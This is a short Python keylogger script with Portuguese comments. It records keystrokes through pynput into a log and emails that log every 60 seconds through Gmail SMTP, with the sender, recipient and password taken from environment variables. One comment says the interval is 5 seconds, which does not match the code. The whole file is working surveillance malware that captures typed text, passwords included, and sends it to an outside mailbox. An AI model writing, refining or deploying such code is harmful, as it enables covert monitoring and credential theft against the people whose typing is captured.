from pynput import keyboard
import smtplib 
from email.mime.text import MIMEText
from threading import Timer
import os

# Variável global de mensagem/log inicializada
log = "Mensagem de teste de envio automático"

# Configurações de E-mail obtidas das variáveis de ambiente
email_origem = os.getenv("EMAIL_ORIGEM")
email_destino = os.getenv("EMAIL_DESTINO")
senha = os.getenv("SENHA")

print("Origem definida:", email_origem is not None)
print("Destino definido:", email_destino is not None)
print("Senha definida:", senha is not None)


def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg["Subject"] = "Teste Python"
        msg["From"] = email_origem
        msg["To"] = email_destino

    try:
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=20) as server:
            server.set_debuglevel(1)
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(email_origem, senha)
            server.send_message(msg)

        
    
        log = ""  # Limpa o conteúdo após a tentativa de envio

        # Agenda a próxima verificação para daqui a 5 segundos
        timer = Timer(60, enviar_email)
        timer.start()
    except Exception as erro:
        print(f"Erro: {type(erro).__name__}: {erro}") 
# Início da execução
if __name__ == "__main__":         
    enviar_email()
        
def on_press (key):
    global log 
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space  :
            log+= " "
        
        elif key == keyboard.Key.enter:
            log+= "\n"
            
        elif key == keyboard.Key.backspace:
          log += "[<]"
        else:
            pass

with keyboard.Listener(on_press=on_press) as Listener:
    enviar_email()
    Listener.join()            
                
     